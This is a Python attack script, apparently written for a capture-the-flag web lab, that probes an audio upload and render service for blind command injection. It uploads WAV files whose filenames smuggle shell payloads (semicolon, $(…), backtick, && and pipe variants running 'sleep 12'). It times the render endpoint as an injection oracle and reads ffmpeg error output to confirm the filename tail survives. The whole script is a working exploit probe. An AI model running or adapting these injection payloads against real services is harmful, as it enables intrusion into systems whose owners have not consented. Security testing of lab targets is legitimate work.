#!/usr/bin/env python3
import io, json, re, time, urllib.request, urllib.error, http.cookiejar, struct, math

BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
def sess():
    cj=http.cookiejar.CookieJar()
    o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    o.addheaders=[("User-Agent","Mozilla/5.0")]; return o
def do(o, path, data=None, headers=None, method=None):
    r=urllib.request.Request(BASE+path, data=data, method=method)
    for k,v in (headers or {}).items(): r.add_header(k,v)
    try:
        resp=o.open(r,timeout=60); return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e: return e.code, dict(e.headers), e.read()
    except Exception as e: return -1,{},str(e).encode()
def wav():
    n=8000; fr=b"".join(struct.pack("<h",int(4000*math.sin(2*math.pi*300*i/8000))) for i in range(n))
    return b"RIFF"+struct.pack("<I",36+len(fr))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,8000,16000,2,16)+b"data"+struct.pack("<I",len(fr))+fr
def upload(o, fn, content=None):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: audio/wav\r\n\r\n").encode())
    body.write(content or wav()); body.write(f"\r\n--{bd}--\r\n".encode())
    return do(o,"/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")
def render(o, **kw):
    t=time.time()
    st,h,b=do(o,"/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    dt=time.time()-t
    try: j=json.loads(b)
    except: j=b.decode('utf-8','replace')
    return dt,j

print("===== COMMAND-INJECTION TIMING ORACLE via upload extension =====")
# baseline
o=sess(); do(o,"/studio"); upload(o,"clip.wav")
dt,j=render(o,slug="p",theme="midnight"); print(f"baseline .wav render {dt:.2f}s ok={j.get('ok') if isinstance(j,dict) else j}")

payloads = {
 "shell-semicolon-sleep": "clip.wav;sleep 12;x.wav",
 "shell-dollar-sleep":    "clip.wav$(sleep 12).wav",
 "shell-backtick-sleep":  "clip.wav`sleep 12`.wav",
 "shell-and-sleep":       "clip.wav&&sleep 12&&.wav",
 "shell-pipe-sleep":      "clip.wav|sleep 12|.wav",
}
for name,fn in payloads.items():
    o=sess(); do(o,"/studio")
    st,h,b=upload(o,fn)
    inp=re.search(r"(source\.[^'\"\n]*)", b.decode('utf-8','replace'))
    dt,j=render(o,slug="p",theme="midnight")
    err=(j.get("errors") if isinstance(j,dict) else str(j)) or ""
    tail=err[err.rfind("source."):][:80] if "source." in err else err[-90:]
    print(f"\n{name}: fn={fn!r}\n   render={dt:.2f}s ok={j.get('ok') if isinstance(j,dict) else '?'} inputseen={tail!r}")

print("\n===== also: what exact input path does ffmpeg report for a weird ext (to confirm tail kept) =====")
o=sess(); do(o,"/studio"); upload(o,"clip.wavZZ;echoMARK")
dt,j=render(o,slug="a:b",theme="midnight")  # force error to echo Input path
err=(j.get("errors") if isinstance(j,dict) else str(j)) or ""
m=re.search(r"from '([^']+)'", err) or re.search(r"(/opt/app/media/\S+)", err)
print("input path echoed:", m.group(1) if m else "??", " (ext tail preserved?)")
print("\nDONE")
